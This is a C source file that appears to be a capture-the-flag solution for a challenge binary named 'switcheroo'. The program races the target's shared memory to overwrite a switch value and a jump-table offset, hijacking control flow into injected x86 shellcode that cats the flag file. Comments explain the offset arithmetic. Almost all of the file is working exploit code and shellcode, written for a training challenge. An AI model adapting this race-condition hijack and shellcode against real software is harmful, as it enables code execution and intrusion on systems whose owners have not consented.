#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <signal.h>

#define SHMEM_SZ 1024
char *shmem_name;
int *mem;

// /bin/cat /challenges/switcheroo/flag.txt
char shellcode[] = 
  "\x31\xC0\x50\x68\x2F\x63\x61\x74\x68\x2F\x62\x69\x6E\x89\xE3\x50"
  "\x68\x74\x78\x74\x00\x68\x6C\x61\x67\x2E\x68\x6F\x6F\x2F\x66\x68"
  "\x63\x68\x65\x72\x68\x73\x77\x69\x74\x68\x67\x65\x73\x2F\x68\x6C"
  "\x6C\x65\x6E\x68\x2F\x63\x68\x61\x89\xE1\x50\x51\x53\x89\xE1\x8D"
  "\x51\x08\x31\xC0\x83\xC0\x0B\xCD\x80";

void kill_process() {
  mem[0] = 0x4;
  wait(NULL);

  exit(1);
}

void force_kill_child(int pid) {
  kill(pid, SIGKILL);
  wait(NULL);
  exit(1);
}

void run_target() {
  char *args[] = {"/challenges/switcheroo/switcheroo", shmem_name, NULL};
  execve(args[0], args, NULL);
}

void run_exploit(int pid) {
  int fd;

  // Sleep for a bit. The challenge binary opens the shared memory 
  // in exclusive mode and will error if we beat it to creating the share.
  usleep(5000);

  fd = shm_open(shmem_name, O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
  if (fd < 0) {
    perror("shm_open");
    goto error;
  }

  mem = mmap(NULL, SHMEM_SZ, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
  if (mem == MAP_FAILED) {
    perror("mmap");
    goto error;
  }

  // Don't need these anymore.
  close(fd);
  shm_unlink(shmem_name);

  // We have a 1024 byte shared buffer to play with.
  // It's opened as read | execute in the target so it's clear we 
  // should be messing with shellcode.
  // 
  // Only the first int in the memory is actually used by the target
  // so we're free to do whatever we want with the rest.
  //
  // This buffer is used for three different things:
  // 1. It stores the value used in the switch statement which is used as an
  //    offset into a jump table.
  // 2. The jump table stores offsets that are added to a constant (the GOT address)
  //    for each case block. We store our own offset in the shared memory which 
  //    is addressed using the value above. This value is chosen so that 
  //    the calculated address to jump to points into the shared memory.
  // 3. Our shellcoded which is jumped into.
  //
  // The layout is:
  // [ Switch Value | Jump Offset | Shellcode ... ]

  // Jump to getflag
  // mem[1] = 0xffffe8d0;
  
  // Jump to shellcode
  // Offset from base to GOT (ebx) = 0x1fa0
  // value = delta - 0x1fa0 + 8
  mem[1] = 0xa197e068;
  memcpy(mem + 2, shellcode, sizeof(shellcode));

  // This is just here so we don't spin forever.
  // Most of the time we'll win the race well before one second
  // but sometimes it runs a bit longer. 
  signal(SIGALRM, kill_process);
  alarm(1);

  // Fast asf boi
  for (;;) {
    mem[0] = 0x0;

    // delta = target - base
    // value = (delta + 0x130c - 0x1fa0 + 4) / 4
    // This is the offset in eax from which the value applied to edx 
    // for the jump target is read from. Using a delta value of 0xa1980000
    mem[0] = 0x2865fcdc;
  }

error:
  // Need to make sure the target has closed and unlinked the shared memory
  // so it doesn't persist after the child is killed.
  usleep(10000);
  force_kill_child(pid);
  exit(1);
}

int main(int argc, char **argv) {
  if(argc < 2) {
    fprintf(stderr, "%s <shmem_name>\n", argv[0] == NULL ? "./challenge" : argv[0]);
    exit(1);
  }

  shmem_name = argv[1];

  if(strlen(shmem_name) <= 1) {
    fprintf(stderr, "shmem_name is invalid.\n");
    exit(1);
  }

  if(shmem_name[0] != '/') {
    fprintf(stderr, "shmem_name must start with a '/'\n");
    exit(1);
  }

  int pid;
  if ((pid = fork()) == 0) {
    run_target();
  } else {
    run_exploit(pid);
  }

  return 0;
}
